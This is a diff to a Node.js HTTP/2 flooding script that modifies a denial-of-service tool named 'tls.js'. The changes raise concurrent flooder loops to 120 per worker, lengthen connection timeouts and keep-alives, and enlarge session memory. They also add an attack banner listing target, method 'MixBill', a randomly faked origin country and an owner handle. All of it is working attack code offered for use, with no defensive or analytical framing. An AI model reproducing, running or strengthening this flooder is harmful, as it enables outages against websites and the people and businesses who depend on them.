@@ -9,7 +9,7 @@
  process.setMaxListeners(0);
  require("events").EventEmitter.defaultMaxListeners = 0;
 
- if (process.argv.length < 5){console.log(`Usage: node tls.js URL TIME REQ_PER_SEC THREADS\nExample: node tls.js https://tls.mrrage.xyz 500 8 1`); process.exit();}
+ if (process.argv.length < 5){console.log(`[VVIP]\n How To use?: node tlsv5 url time rps thread`); process.exit();}
  
  const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
  const ciphers = "GREASE:" + [
@@ -49,6 +49,19 @@
      secureOptions: secureOptions,
      secureProtocol: secureProtocol
  };
+
+let now = new Date();
+let year = now.getFullYear();
+let month = now.getMonth() + 1;
+let hours = now.getHours();
+
+// Daftar negara
+var countries = ["Indonesia", "Malaysia", "Singapore", "Thailand", "Vietnam", "Philipina", "United States", "United kingdom", "Canada", "Russia", "Japan", "Myanmar", "German", "Netherlands"];
+
+// Mendapatkan negara secara acak
+var randomCountry = countries[Math.floor(Math.random() * countries.length)];
+
+// Menampilkan negara yang dipilih secara acak
  
  const secureContext = tls.createSecureContext(secureContextOptions);
  
@@ -70,7 +83,17 @@
         //console.log("Threads " + counter +  " started.");
         cluster.fork();
     }
-} else {for (let i = 0; i < 10; i++) { setInterval(runFlooder, 0) }}
+
+console.log(``)
+console.log(`Target: ${process.argv[2]}`);
+console.log(`Port: ${process.argv[4]}`);
+console.log(`Time: ${process.argv[3]}`);
+console.log(`Methods: MixBill`);
+console.log("Org: " + randomCountry);
+console.log(`Start Attack: ${year}-${month}-${hours}`);
+console.log(`Owner: @Erorr37cs`);
+
+} else {for (let i = 0; i < 120; i++) { setInterval(runFlooder, 0) }}
  
  class NetSocket {
      constructor(){}
@@ -89,8 +112,8 @@
          readable: true
      });
  
-     connection.setTimeout(options.timeout * 10000);
-     connection.setKeepAlive(true, 10000);
+     connection.setTimeout(options.timeout * 100000);
+     connection.setKeepAlive(true, 100000);
      connection.setNoDelay(true)
  
      connection.on("connect", () => {
@@ -142,6 +165,8 @@
  }
  
  headers[":method"] = "GET";
+ headers[":method"] = "POST";
+ headers[":method"] = "PUT";
  headers[":path"] = parsedTarget.path;
  headers[":scheme"] = "https";
  headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";
@@ -175,7 +200,7 @@
      Socker.HTTP(proxyOptions, (connection, error) => {
          if (error) return
  
-         connection.setKeepAlive(true, 60000);
+         connection.setKeepAlive(true, 600000);
          connection.setNoDelay(true)
  
          const settings = {
@@ -214,7 +239,7 @@
          const client = http2.connect(parsedTarget.href, {
              protocol: "https:",
              settings: settings,
-             maxSessionMemory: 3333,
+             maxSessionMemory: 655000,
              maxDeflateDynamicTableSize: 4294967295,
              createConnection: () => tlsConn
              //socket: connection,
